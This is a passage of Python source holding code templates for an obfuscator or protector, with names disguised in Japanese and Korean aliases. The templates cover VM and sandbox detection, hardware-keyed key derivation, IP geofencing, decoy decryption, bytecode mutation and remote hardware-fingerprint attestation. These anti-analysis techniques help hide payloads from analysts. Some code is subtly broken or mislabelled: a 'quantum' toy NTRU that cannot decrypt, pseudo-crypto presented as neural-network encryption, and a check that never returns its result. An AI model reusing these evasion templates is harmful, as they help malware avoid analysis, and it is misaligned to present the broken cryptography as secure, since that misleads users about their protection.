        with _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5) as r:
            data = _nixon_ジェイソン제이슨.loads(r.read())
            if "Answer" in data:
                return data["Answer"][0]["data"].strip('"')
    except: pass
    return None'''
TLS_CTX_SOURCE = r'''def {FUNC_TLS_CTX}():
    # Verified TLS for the emitted key fetch.
    #
    # The certificate chain AND the hostname are checked against a trusted
    # CA bundle.  The bundle is the system trust store, plus an optional
    # private CA embedded at build time (--tls-ca-bundle): embedding ADDS
    # trust for an operator-owned endpoint, it never disables verification.
    #
    # This replaces the old unverified-context helper, which accepted any
    # certificate and therefore let a network attacker choose the session
    # key the artifact derives from the response.
    import ssl as _nx_ssl
    try:
        _nx_ctx = _nx_ssl.create_default_context()
    except Exception:
        return None
    _nx_ca = {tls_ca_b64}
    if _nx_ca:
        try:
            import base64 as _nx_b64
            _nx_ctx.load_verify_locations(
                cadata=_nx_b64.b64decode(_nx_ca).decode("ascii"))
        except Exception:
            pass
    try:
        _nx_ctx.verify_mode = _nx_ssl.CERT_REQUIRED
        _nx_ctx.check_hostname = True
    except Exception:
        pass
    return _nx_ctx'''
OPAQUE_CONST_SOURCE = r'''
class {OPAQUE_CONST_CLS}:
    _cache = {}
    _entropy_pool = bytearray()
    @staticmethod
    def {METHOD_CPU_TEMP}():
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                paths = ["/sys/class/thermal/thermal_zone0/temp", "/sys/class/hwmon/hwmon0/temp1_input"]
                for path in paths:
                    try:
                        with open(path, "r") as f:
                            temp = int(f.read().strip())
                            return temp % 65537
                    except: continue
            elif _nixon_プラットフォーム플랫폼.system() == "Darwin":
                return (int(_nixon_時間시간.time() * 1000) % 65537)
        except: pass
        return (_nixon_シークレット시크릿.randbelow(65537) if hasattr(_nixon_シークレット시크릿, 'randbelow') else 
                int.from_bytes(_nixon_オペレーション운영.urandom(2), 'little'))
    @staticmethod
    def {METHOD_ENTROPY_INJECT}(local_vars):
        try:
            entropy = _nixon_オペレーション운영.urandom(8)
            for i, (k, v) in enumerate(list(local_vars.items())[:5]):
                if isinstance(v, int) and not isinstance(v, bool):
                    local_vars[k] = v ^ entropy[i % 8]
        except: pass
    @staticmethod
    def {METHOD_TIME_BRANCH}(base_val):
        ms = int(_nixon_時間시간.time() * 1000) % 256
        h = _nixon_ハッシュ해시.sha256((str(base_val) + str(ms)).encode()).digest()
        return h[0] & 0x0F
    @staticmethod
    def {METHOD_OPAQUE_PRED}(seed):
        temp = {OPAQUE_CONST_CLS}.{METHOD_CPU_TEMP}()
        branch = {OPAQUE_CONST_CLS}.{METHOD_TIME_BRANCH}(seed)
        combined = (temp * 31 + branch * 17 + seed) % 256
        return combined
'''
DECOY_DECRYPT_SOURCE = r'''
class {DECOY_DECRYPT_CLS}:
    def __init__(self, real_cipher, num_decoys=15):
        self._real = real_cipher
        self._decoys = num_decoys
        self._fake_keys = [_nixon_シークレット시크릿.token_bytes(32) for _ in range(num_decoys)]
    def {METHOD_DECOY_DEC}(self, data, nonce, real_key_idx=-1):
        results = []
        real_idx = _nixon_シークレット시크릿.randbelow(self._decoys + 1) if real_key_idx < 0 else real_key_idx
        for i in range(self._decoys + 1):
            if i == real_idx:
                result = self._real.decrypt(data, nonce)
                results.append((i, result, True))
            else:
                fake_out = self._fake_decrypt(data, self._fake_keys[i % len(self._fake_keys)], nonce)
                results.append((i, fake_out, False))
            _nixon_時間시간.sleep(0.0001)
        _nixon_ランダム무작위.shuffle(results)
        for idx, result, is_real in results:
            if is_real:
                return result
        return results[0][1]
    def _fake_decrypt(self, data, fake_key, nonce):
        out = bytearray(len(data))
        k_h = _nixon_ハッシュ해시.sha256(fake_key + nonce).digest()
        for i in range(len(data)):
            if i % 32 == 0:
                k_h = _nixon_ハッシュ해시.sha256(k_h + str(i).encode()).digest()
            out[i] = data[i] ^ k_h[i % 32]
        return bytes(out)
    def {METHOD_BATCH_FAKE}(self, data, iterations=10):
        for _ in range(iterations):
            fake_key = _nixon_シークレット시크릿.token_bytes(32)
            fake_nonce = _nixon_シークレット시크릿.token_bytes(16)
            _ = self._fake_decrypt(data[:min(1024, len(data))], fake_key, fake_nonce)
'''
EXECUTION_TRACE_SOURCE = r'''
class {EXEC_TRACE_CLS}:
    def __init__(self, seed=None):
        self._state = _nixon_シークレット시크릿.token_bytes(32) if seed is None else seed
        self._exec_count = 0
        self._branch_history = []
    def {METHOD_TRACE_STEP}(self):
        self._exec_count += 1
        entropy = _nixon_オペレーション운영.urandom(4)
        self._state = _nixon_ハッシュ해시.sha256(self._state + entropy + 
                                     self._exec_count.to_bytes(4, 'little')).digest()
        return self._state
    def {METHOD_TRACE_BRANCH}(self, condition_id):
        state_hash = _nixon_ハッシュ해시.sha256(self._state + condition_id.to_bytes(4, 'little')).digest()
        branch = state_hash[0] & 0x03
        self._branch_history.append(branch)
        if len(self._branch_history) > 100:
            self._branch_history = self._branch_history[-50:]
        return branch
    def {METHOD_TRACE_OBFUSCATE}(self, value):
        if isinstance(value, int):
            mask = int.from_bytes(self._state[:4], 'little')
            return value ^ mask
        elif isinstance(value, bytes):
            result = bytearray(value)
            for i in range(len(result)):
                result[i] ^= self._state[i % 32]
            return bytes(result)
        return value
    def {METHOD_TRACE_VERIFY}(self, expected_exec_count):
        if self._exec_count < expected_exec_count:
            return False
        return True
'''
ENHANCED_ENV_KEYING_SOURCE = r'''
class {ENV_KEYING_CLS}:
    TOLERANCE = 3
    def __init__(self):
        self._factors = {}
        self._weights = {
            'cpu_id': 10, 'mac': 8, 'disk_serial': 9, 'gpu': 7, 'bios_version': 6,
            'bios_date': 5, 'boot_uuid': 8, 'memory_size': 4, 'cpu_cores': 3,
            'hostname_hash': 2, 'timezone': 1, 'locale': 1
        }
    def {METHOD_COLLECT_ALL}(self):
        self._factors['cpu_id'] = self._get_cpu_id()
        self._factors['mac'] = self._get_mac()
        self._factors['disk_serial'] = self._get_disk_serial()
        self._factors['gpu'] = self._get_gpu()
        self._factors['bios_version'] = self._get_bios_version()
        self._factors['bios_date'] = self._get_bios_date()
        self._factors['boot_uuid'] = self._get_boot_uuid()
        self._factors['memory_size'] = self._get_memory_size()
        self._factors['cpu_cores'] = self._get_cpu_cores()
        self._factors['hostname_hash'] = self._get_hostname_hash()
        self._factors['timezone'] = self._get_timezone()
        self._factors['locale'] = self._get_locale()
        return self._factors
    def _get_cpu_id(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    for line in f:
                        if "model name" in line:
                            return _nixon_ハッシュ해시.sha256(line.encode()).hexdigest()[:16]
            elif _nixon_プラットフォーム플랫폼.system() == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")
                return _nixon_ハッシュ해시.sha256(str(winreg.QueryValueEx(key, "ProcessorNameString")[0]).encode()).hexdigest()[:16]
        except: pass
        return "unknown_cpu"
    def _get_mac(self):
        try:
            import uuid
            from obfuscator.hwid import machine_mac as _machine_mac
            _mac_hex = _machine_mac() or "0" * 12
            mac = ':'.join(_mac_hex[i:i + 2] for i in range(0, 12, 2))
            return _nixon_ハッシュ해시.sha256(mac.encode()).hexdigest()[:16]
        except: return "unknown_mac"
    def _get_disk_serial(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                for dev in ["/dev/sda", "/dev/nvme0n1", "/dev/vda"]:
                    try:
                        result = _nixon_サブプロセス서브프로세스.run(["udevadm", "info", "--query=property", "--name=" + dev], 
                            capture_output=True, text=True, timeout=2)
                        for line in result.stdout.split("\\n"):
                            if "ID_SERIAL=" in line:
                                return _nixon_ハッシュ해시.sha256(line.encode()).hexdigest()[:16]
                    except: continue
        except: pass
        return "unknown_disk"
    def _get_gpu(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                result = _nixon_サブプロセス서브프로세스.run(["lspci"], capture_output=True, text=True, timeout=2)
                for line in result.stdout.split("\\n"):
                    if "VGA" in line or "3D" in line:
                        return _nixon_ハッシュ해시.sha256(line.encode()).hexdigest()[:16]
            elif _nixon_プラットフォーム플랫폼.system() == "Windows":
                result = _nixon_サブプロセス서브프로세스.run(["wmic", "path", "win32_VideoController", "get", "name"], 
                    capture_output=True, text=True, timeout=2)
                return _nixon_ハッシュ해시.sha256(result.stdout.encode()).hexdigest()[:16]
        except: pass
        return "unknown_gpu"
    def _get_bios_version(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/sys/class/dmi/id/bios_version", "r") as f:
                    return f.read().strip()[:16]
        except: pass
        return "unknown_bios"
    def _get_bios_date(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/sys/class/dmi/id/bios_date", "r") as f:
                    return f.read().strip()[:16]
        except: pass
        return "unknown_date"
    def _get_boot_uuid(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                result = _nixon_サブプロセス서브프로세스.run(["findmnt", "-n", "-o", "UUID", "/"], 
                    capture_output=True, text=True, timeout=2)
                return result.stdout.strip()[:36]
        except: pass
        return "unknown_uuid"
    def _get_memory_size(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/meminfo", "r") as f:
                    for line in f:
                        if "MemTotal" in line:
                            mem_kb = int(line.split()[1])
                            return str(mem_kb // (1024 * 1024))
        except: pass
        return "0"
    def _get_cpu_cores(self):
        try:
            return str(_nixon_オペレーション운영.cpu_count() or 0)
        except: return "0"
    def _get_hostname_hash(self):
        try:
            return _nixon_ハッシュ해시.sha256(_nixon_ソケット소켓.gethostname().encode()).hexdigest()[:8]
        except: return "unknown"
    def _get_timezone(self):
        try:
            import time
            return time.tzname[0][:8] if time.tzname else "UTC"
        except: return "UTC"
    def _get_locale(self):
        try:
            import locale
            return locale.getdefaultlocale()[0][:8] if locale.getdefaultlocale()[0] else "en_US"
        except: return "en_US"
    def {METHOD_FUZZY_MATCH}(self, stored_factors):
        score = 0
        max_score = sum(self._weights.values())
        for key, weight in self._weights.items():
            current = self._factors.get(key, "")
            stored = stored_factors.get(key, "")
            if current == stored:
                score += weight
            elif self._hamming_distance(current, stored) <= self.TOLERANCE:
                score += weight // 2
        return score, max_score, score >= (max_score * 0.7)
    def _hamming_distance(self, s1, s2):
        if len(s1) != len(s2):
            return max(len(s1), len(s2))
        return sum(c1 != c2 for c1, c2 in zip(s1, s2))
    def {METHOD_DERIVE_KEY}(self):
        combined = "".join(str(v) for v in sorted(self._factors.values()))
        return _nixon_ハッシュ해시.sha256(combined.encode()).digest()
'''
TOTP_SOURCE = r'''
class {TOTP_CLS}:
    def __init__(self, secret, hw_id):
        self._secret = secret
        self._hw_id = hw_id
    def generate(self, window=30):
        ts = int(_nixon_時間시간.time()) // window
        msg = self._hw_id + str(ts).encode()
        h = _nixon_エイチマック백(self._secret, msg, _nixon_ハッシュ해시.sha256).digest()
        offset = h[-1] & 0x0F
        code = ((h[offset] & 0x7F) << 24 |
                (h[offset+1] & 0xFF) << 16 |
                (h[offset+2] & 0xFF) << 8 |
                (h[offset+3] & 0xFF))
        return '{:06d}'.format(code % 1000000)
    def verify(self, token, window=30, tolerance=1):
        ts = int(_nixon_時間시간.time()) // window
        for i in range(-tolerance, tolerance + 1):
            check_ts = ts + i
            msg = self._hw_id + str(check_ts).encode()
            h = _nixon_エイチマック백(self._secret, msg, _nixon_ハッシュ해시.sha256).digest()
            offset = h[-1] & 0x0F
            code = ((h[offset] & 0x7F) << 24 |
                    (h[offset+1] & 0xFF) << 16 |
                    (h[offset+2] & 0xFF) << 8 |
                    (h[offset+3] & 0xFF))
            if '{:06d}'.format(code % 1000000) == token:
                return True
        return False
'''
HW_PERF_SOURCE = r'''
class {HW_PERF_CLS}:
    def __init__(self):
        self._cache = {}
    def {METHOD_CPUID_HYPERVISOR}(self):
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    content = f.read()
                    if "hypervisor" in content: return True
        except: pass
        return False
    def {METHOD_GET_FINGERPRINT}(self):
        fp = []
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    for line in f:
                        if "microcode" in line:
                            fp.append(line.strip())
                            break
        except: pass
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                 devices = _nixon_オペレーション운영.listdir("/sys/bus/pci/devices/")
                 fp.append(",".join(sorted(devices)))
        except: pass
        return _nixon_ハッシュ해시.sha256("".join(fp).encode()).hexdigest()
'''
QUANTUM_CRYPTO_SOURCE = r'''
class {QUANTUM_CRYPTO_CLS}:
    N = 509
    Q = 2048
    def __init__(self, seed=None):
        self._rng = __import__('secrets').SystemRandom()
        self._f = None
        self._g = None
        self._h = None
    def {METHOD_GEN_POLY}(self, ones, neg_ones):
        poly = [0] * self.N
        positions = self._rng.sample(range(self.N), ones + neg_ones)
        for i in range(ones):
            poly[positions[i]] = 1
        for i in range(ones, ones + neg_ones):
            poly[positions[i]] = -1
        return poly
    def {METHOD_POLY_MUL}(self, a, b):
        result = [0] * self.N
        for i in range(self.N):
            if a[i] == 0: continue
            for j in range(self.N):
                if b[j] == 0: continue
                idx = (i + j) % self.N
                result[idx] = (result[idx] + a[i] * b[j]) % self.Q
        return result
    def {METHOD_POLY_ADD}(self, a, b):
        return [(a[i] + b[i]) % self.Q for i in range(self.N)]
    def {METHOD_GEN_KEYS}(self):
        self._f = self.{METHOD_GEN_POLY}(3, 3)
        self._f[0] = (self._f[0] + 1) % self.Q
        self._g = self.{METHOD_GEN_POLY}(3, 3)
        self._h = self.{METHOD_POLY_MUL}(self._g, self._f)
        return {'public': self._h, 'private': self._f}
    def {METHOD_ENCRYPT}(self, message_bytes, public_key):
        if len(message_bytes) > self.N // 8:
            message_bytes = message_bytes[:self.N // 8]
        m = [0] * self.N
        for i, byte in enumerate(message_bytes):
            for bit in range(8):
                if i * 8 + bit < self.N:
                    m[i * 8 + bit] = (byte >> bit) & 1
        r = self.{METHOD_GEN_POLY}(3, 3)
        e = self.{METHOD_POLY_MUL}(public_key, r)
        c = self.{METHOD_POLY_ADD}(e, m)
        return c
    def {METHOD_DECRYPT}(self, ciphertext, private_key):
        a = self.{METHOD_POLY_MUL}(ciphertext, private_key)
        m = [(1 if (v % self.Q) < self.Q // 2 else 0) for v in a]
        result = bytearray(self.N // 8)
        for i in range(len(result)):
            for bit in range(8):
                if i * 8 + bit < self.N and m[i * 8 + bit]:
                    result[i] |= (1 << bit)
        return bytes(result)
'''
SECURE_ENCLAVE_SOURCE = r'''
class {SECURE_ENCLAVE_CLS}:
    def __init__(self, enclave_size=4096):
        self._size = enclave_size
        self._enclave = None
        self._guard_before = None
        self._guard_after = None
        self._attestation_key = _nixon_シークレット시크릿.token_bytes(32)
    def {METHOD_ALLOC_ENCLAVE}(self):
        if _nixon_プラットフォーム플랫폼.system() != "Linux":
            self._enclave = bytearray(self._size)
            return True
        try:
            try:
                libc = _nixon_シータイプ씨타입.CDLL(_nixon_シータイプ씨타입.util.find_library("c"))
            except:
                try:
                    libc = _nixon_シータイプ씨타입.CDLL("libc.so.6")
                except:
                    try: libc = _nixon_シータイプ씨타입.CDLL("libc.so")
                    except: return True
            PAGE = 4096
            total_size = PAGE + self._size + PAGE
            libc.mmap.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, 
                                  _nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_int, 
                                  _nixon_シータイプ씨타입.c_int, _nixon_シータイプ씨타입.c_long]
            libc.mmap.restype = _nixon_シータイプ씨타입.c_void_p
            libc.mprotect.argtypes = [_nixon_シータイプ씨타입.c_void_p, _nixon_シータイプ씨타입.c_size_t, _nixon_シータイプ씨타입.c_int]
            PROT_NONE = 0x0
            PROT_READ = 0x1
            PROT_WRITE = 0x2
            PROT_EXEC = 0x4
            MAP_PRIVATE = 0x02
            MAP_ANONYMOUS = 0x20
            base = libc.mmap(0, total_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
            if base == -1: return False
            self._guard_before = base
            libc.mprotect(self._guard_before, PAGE, PROT_NONE)
            self._enclave = base + PAGE
            self._guard_after = base + PAGE + self._size
            libc.mprotect(self._guard_after, PAGE, PROT_NONE)
            return True
        except: 
            self._enclave = bytearray(self._size)
            return True
    def {METHOD_SEAL_DATA}(self, data):
        if len(data) > self._size:
            data = data[:self._size]
        sealed = bytearray(data)
        key = _nixon_ハッシュ해시.sha256(self._attestation_key + b"SEAL").digest()
        for i in range(len(sealed)):
            sealed[i] ^= key[i % 32]
        if isinstance(self._enclave, bytearray):
            self._enclave[:len(sealed)] = sealed
        else:
            _nixon_シータイプ씨타입.memmove(self._enclave, bytes(sealed), len(sealed))
        return True
    def {METHOD_UNSEAL_DATA}(self, length):
        key = _nixon_ハッシュ해시.sha256(self._attestation_key + b"SEAL").digest()
        if isinstance(self._enclave, bytearray):
            sealed = bytes(self._enclave[:length])
        else:
            sealed = _nixon_シータイプ씨타입.string_at(self._enclave, length)
        unsealed = bytearray(sealed)
        for i in range(len(unsealed)):
            unsealed[i] ^= key[i % 32]
        return bytes(unsealed)
    def {METHOD_ATTEST}(self, challenge):
        proof = _nixon_ハッシュ해시.sha256(self._attestation_key + challenge + b"ATTEST").digest()
        return proof
    def {METHOD_VERIFY_ATTEST}(self, challenge, proof):
        expected = self.{METHOD_ATTEST}(challenge)
        return expected == proof
'''
INTEGRITY_MONITOR_SOURCE = r'''
class {INTEGRITY_MON_CLS}:
    def __init__(self):
        self._checksums = {}
        self._running = False
        self._thread = None
        self._interval = 5.0
        self._violations = []
    def {METHOD_REGISTER_FUNC}(self, func_name, func_obj):
        try:
            code = func_obj.__code__.co_code if hasattr(func_obj, '__code__') else b''
            self._checksums[func_name] = _nixon_ハッシュ해시.sha256(code).hexdigest()
        except: pass
    def {METHOD_VERIFY_FUNC}(self, func_name, func_obj):
        try:
            code = func_obj.__code__.co_code if hasattr(func_obj, '__code__') else b''
            current = _nixon_ハッシュ해시.sha256(code).hexdigest()
            stored = self._checksums.get(func_name)
            if stored and current != stored:
                self._violations.append((func_name, _nixon_時間시간.time()))
                return False
            return True
        except: return True
    def {METHOD_CROSS_VERIFY}(self, func_pairs):
        for name_a, func_a, name_b, func_b in func_pairs:
            if not self.{METHOD_VERIFY_FUNC}(name_a, func_a):
                return False
            if not self.{METHOD_VERIFY_FUNC}(name_b, func_b):
                return False
        return True
    def {METHOD_START_MONITOR}(self, registered_funcs):
        if self._running: return
        self._running = True
        def monitor_loop():
            while self._running:
                for name, func in registered_funcs.items():
                    self.{METHOD_VERIFY_FUNC}(name, func)
                _nixon_時間시간.sleep(self._interval)
        self._thread = _nixon_スレッド쓰레드.Thread(target=monitor_loop, daemon=True)
        self._thread.start()
    def {METHOD_STOP_MONITOR}(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=1.0)
    def {METHOD_GET_VIOLATIONS}(self):
        return list(self._violations)
'''
ANTI_EMULATOR_SOURCE = r'''
class {ANTI_EMULATOR_CLS}:
    @staticmethod
    def {METHOD_CHECK_RDRAND}():
        if _nixon_プラットフォーム플랫폼.machine() not in ["x86_64", "AMD64"]:
            return True
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    content = f.read()
                    return "rdrand" in content.lower()
        except: pass
        return True
    @staticmethod
    def {METHOD_CACHE_TIMING}():
        try:
            iterations = 10000
            start = _nixon_時間시간.perf_counter()
            data = list(range(iterations))
            for i in range(iterations):
                _ = data[i % len(data)]
            elapsed = _nixon_時間시간.perf_counter() - start
            if elapsed > 5.0:
                pass
            if elapsed < 0.00001:
                return False
            return True
        except: return True
    @staticmethod
    def {METHOD_MEM_ALLOC_SPEED}():
        try:
            start = _nixon_時間시간.perf_counter()
            for _ in range(100):
                _ = bytearray(1024 * 1024)
            elapsed = _nixon_時間시간.perf_counter() - start
            if elapsed > 5.0:
                return False
            return True
        except: return True
    @staticmethod
    def {METHOD_CPUID_HYPERVISOR}():
        try:
            if _nixon_プラットフォーム플랫폼.system() == "Linux":
                with open("/proc/cpuinfo", "r") as f:
                    content = f.read().lower()
                    hypervisor_flags = ["hypervisor", "vmware", "kvm", "xen", "virtualbox", "hyper-v"]
                    for flag in hypervisor_flags:
                        if flag in content:
                            return True
                try:
                    result = _nixon_サブプロセス서브프로세스.run(["systemd-detect-virt"], 
                        capture_output=True, text=True, timeout=2)
                    if result.stdout.strip() not in ["none", ""]:
                        return True
                except: pass
        except: pass
        return False
    @staticmethod
    def {METHOD_CHECK_VM_ARTIFACTS}():
        vm_files = [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor"
        ]
        vm_indicators = ["vmware", "virtualbox", "qemu", "kvm", "xen", "hyper-v", "parallels", "virtual"]
        try:
            for filepath in vm_files:
                try:
                    with open(filepath, "r") as f:
                        content = f.read().lower()
                        for indicator in vm_indicators:
                            if indicator in content:
                                return True
                except: continue
        except: pass
        return False
    @staticmethod
    def {METHOD_FULL_CHECK}():
        results = {
            'rdrand': {ANTI_EMULATOR_CLS}.{METHOD_CHECK_RDRAND}(),
            'cache_timing': {ANTI_EMULATOR_CLS}.{METHOD_CACHE_TIMING}(),
            'mem_speed': {ANTI_EMULATOR_CLS}.{METHOD_MEM_ALLOC_SPEED}(),
            'hypervisor': not {ANTI_EMULATOR_CLS}.{METHOD_CPUID_HYPERVISOR}(),
            'vm_artifacts': not {ANTI_EMULATOR_CLS}.{METHOD_CHECK_VM_ARTIFACTS}()
        }
        passed = sum(1 for v in results.values() if v)
'''
CODE_SIGNING_SOURCE = r'''
class {CODE_SIGN_CLS}:
    def __init__(self, signing_key):
        self._key = signing_key
        self._nonce_cache = set()
    def {METHOD_SIGN_STATE}(self, runtime_state):
        nonce = _nixon_シークレット시크릿.token_bytes(16)
        state_hash = _nixon_ハッシュ해시.sha256(
            runtime_state + nonce + str(_nixon_時間시간.time()).encode()
        ).digest()
        signature = _nixon_エイチマック에이치.new(self._key, state_hash, _nixon_ハッシュ해시.sha256).digest()
        return {'nonce': nonce.hex(), 'signature': signature.hex(), 'timestamp': int(_nixon_時間시간.time())}
    def {METHOD_REMOTE_VERIFY}(self, challenge_url, build_id):
        try:
            import uuid as _uuid
            runtime = {
                'hw_id': __import__('obfuscator.hwid', fromlist=['machine_fingerprint_part']).machine_fingerprint_part(),
                'build_id': build_id,
                'uptime': int(_nixon_時間시간.time())
            }
            proof = self.{METHOD_SIGN_STATE}(str(runtime).encode())
            payload = _nixon_ジェイソン제이슨.dumps({**runtime, **proof}).encode()
            req = _nixon_ウラルユーアールエル유알엘.request.Request(challenge_url, data=payload,
                headers={'Content-Type': 'application/json'})
            res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5)
            response = _nixon_ジェイソン제이슨.loads(res.read())
            return response.get('valid', False)
        except:
            return False
    def {METHOD_LOCAL_ATTEST}(self, expected_hash):
        import inspect
        frame = _nixon_システム시스템._getframe(1)
        caller_code = frame.f_code.co_code
        actual_hash = _nixon_ハッシュ해시.sha256(caller_code).hexdigest()[:16]
        return actual_hash == expected_hash
'''
NN_OBFUSCATION_SOURCE = r'''
class {NN_OBF_CLS}:
    def __init__(self, seed):
        self._rng = _nixon_ランダム무작위.Random(seed)
        self.weights = [self._rng.random() for _ in range(256)]
        self.bias = [self._rng.random() * 0.1 for _ in range(256)]
    def {METHOD_NN_ENCRYPT}(self, value):
        if not isinstance(value, int):
            return value
        idx = value % len(self.weights)
        weight = self.weights[idx]
        bias = self.bias[idx]
        encrypted = int((value * weight + bias) * 10000) % 0xFFFFFFFF
        return encrypted
    def {METHOD_NN_DECRYPT}(self, encrypted, original_hint):
        for candidate in range(max(0, original_hint - 20), original_hint + 20):
            idx = candidate % len(self.weights)
            weight = self.weights[idx]
            bias = self.bias[idx]
            test = int((candidate * weight + bias) * 10000) % 0xFFFFFFFF
            if test == encrypted:
                return candidate
        return None
    def {METHOD_NN_TRANSFORM_ARRAY}(self, data):
        result = bytearray(len(data))
        for i, b in enumerate(data):
            idx = (i + b) % 256
            result[i] = int((b * self.weights[idx] * 255) % 256)
        return bytes(result)
'''
BLOCKCHAIN_LICENSE_SOURCE = r'''
class {BLOCKCHAIN_LIC_CLS}:
    def __init__(self, contract_address, rpc_url):
        self._contract = contract_address
        self._rpc = rpc_url
    def {METHOD_CHECK_LICENSE}(self, hw_id):
        try:
            hw_hash = _nixon_ハッシュ해시.sha256(hw_id.encode()).hexdigest()
            payload = _nixon_ジェイソン제이슨.dumps({
                'jsonrpc': '2.0',
                'method': 'eth_call',
                'params': [{
                    'to': self._contract,
                    'data': '0x' + hw_hash[:40]
                }, 'latest'],
                'id': 1
            }).encode()
            req = _nixon_ウラルユーアールエル유알엘.request.Request(self._rpc, data=payload,
                headers={'Content-Type': 'application/json'})
            res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=10)
            result = _nixon_ジェイソン제이슨.loads(res.read())
            return result.get('result', '0x0') != '0x0' and result.get('result', '0x0') != '0x'
        except:
            return False
    def {METHOD_VERIFY_OWNERSHIP}(self, token_id, expected_owner):
        try:
            payload = _nixon_ジェイソン제이슨.dumps({
                'jsonrpc': '2.0',
                'method': 'eth_call',
                'params': [{
                    'to': self._contract,
                    'data': '0x6352211e' + hex(token_id)[2:].zfill(64)
                }, 'latest'],
                'id': 1
            }).encode()
            req = _nixon_ウラルユーアールエル유알엘.request.Request(self._rpc, data=payload,
                headers={'Content-Type': 'application/json'})
            res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=10)
            result = _nixon_ジェイソン제이슨.loads(res.read())
            owner = result.get('result', '0x0')[-40:]
            return owner.lower() == expected_owner[-40:].lower()
        except:
            return False
'''
RUNTIME_MUTATION_SOURCE = r'''
class {RUNTIME_MUTATE_CLS}:
    def __init__(self):
        self._mutation_count = 0
        self._mutation_history = []
        self._original_consts = {}
    def {METHOD_MUTATE_FUNC}(self, func_obj):
        self._mutation_count += 1
        if self._mutation_count % 100 != 0:
            return func_obj
        try:
            code = func_obj.__code__
            func_id = id(func_obj)
            if func_id not in self._original_consts:
                self._original_consts[func_id] = code.co_consts
            xor_key = self._mutation_count % 256
            new_consts = tuple(
                (c ^ xor_key if isinstance(c, int) and 0 < c < 256 else c)
                for c in code.co_consts
            )
            new_code = code.replace(co_consts=new_consts)
            func_obj.__code__ = new_code
            self._mutation_history.append((_nixon_時間시간.time(), func_id, xor_key))
        except:
            pass
        return func_obj
    def {METHOD_RESTORE_FUNC}(self, func_obj):
        try:
            func_id = id(func_obj)
            if func_id in self._original_consts:
                code = func_obj.__code__
                new_code = code.replace(co_consts=self._original_consts[func_id])
                func_obj.__code__ = new_code
        except:
            pass
    def {METHOD_GET_MUTATION_LOG}(self):
        return list(self._mutation_history[-100:])
'''
GEOFENCE_SOURCE = r'''
class {GEOFENCE_CLS}:
    def __init__(self, allowed_countries=None, allowed_regions=None):
        self._allowed_countries = allowed_countries or []
        self._allowed_regions = allowed_regions or []
        self._location_cache = None
    def {METHOD_GET_LOCATION}(self):
        if self._location_cache:
            return self._location_cache
        services = [
            'https://ipapi.co/json/',
            'https://ip-api.com/json/',
            'https://ipinfo.io/json'
        ]
        for url in services:
            try:
                req = _nixon_ウラルユーアールエル유알엘.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                res = _nixon_ウラルユーアールエル유알엘.request.urlopen(req, timeout=5)
                data = _nixon_ジェイソン제이슨.loads(res.read())
                self._location_cache = {
                    'country': data.get('country_code') or data.get('countryCode') or data.get('country'),
                    'region': data.get('region') or data.get('regionName'),
                    'city': data.get('city'),
                    'ip': data.get('ip') or data.get('query')
                }
                return self._location_cache
            except:
                continue
        return None
    def {METHOD_CHECK_ALLOWED}(self):
        location = self.{METHOD_GET_LOCATION}()
        if not location:
            return False
        if self._allowed_countries and location.get('country') not in self._allowed_countries:
            return False
        if self._allowed_regions and location.get('region') not in self._allowed_regions:
            return False
        return True
    def {METHOD_GET_LOCATION_KEY}(self):
        location = self.{METHOD_GET_LOCATION}()
        if not location:
            return None
        loc_str = f"{location.get('country','')}-{location.get('region','')}"
        return _nixon_ハッシュ해시.sha256(loc_str.encode()).digest()
'''
HW_PERF_FINGERPRINT_SOURCE = r'''
class {HW_PERF_CLS}:
    def __init__(self):
        self._fingerprint_cache = None
    def {METHOD_CPU_BENCH}(self):
        start = _nixon_時間시간.perf_counter()
        total = 0
        for i in range(500000):
            total += i * i
            total = total % (2**32)
        elapsed = _nixon_時間시간.perf_counter() - start
        return int(elapsed * 1000000)
    def {METHOD_MEM_BANDWIDTH}(self):
        size = 5 * 1024 * 1024
        data = bytearray(size)
        start = _nixon_時間시간.perf_counter()
        for i in range(0, size, 4096):
            data[i] = (data[i] + 1) % 256
        elapsed = _nixon_時間시간.perf_counter() - start
        return int((size / max(elapsed, 0.0001)) / 1024)
    def {METHOD_HASH_BENCH}(self):
        data = b'benchmark_data' * 1000
        start = _nixon_時間시간.perf_counter()
        for _ in range(1000):
            _ = _nixon_ハッシュ해시.sha256(data).digest()
        elapsed = _nixon_時間시간.perf_counter() - start
        return int(elapsed * 1000000)
    def {METHOD_GET_FINGERPRINT}(self):
        if self._fingerprint_cache:
            return self._fingerprint_cache
        cpu_score = self.{METHOD_CPU_BENCH}()
        mem_score = self.{METHOD_MEM_BANDWIDTH}()
        hash_score = self.{METHOD_HASH_BENCH}()
        cpu_bucket = cpu_score // 10000
        mem_bucket = mem_score // 100000
        hash_bucket = hash_score // 10000
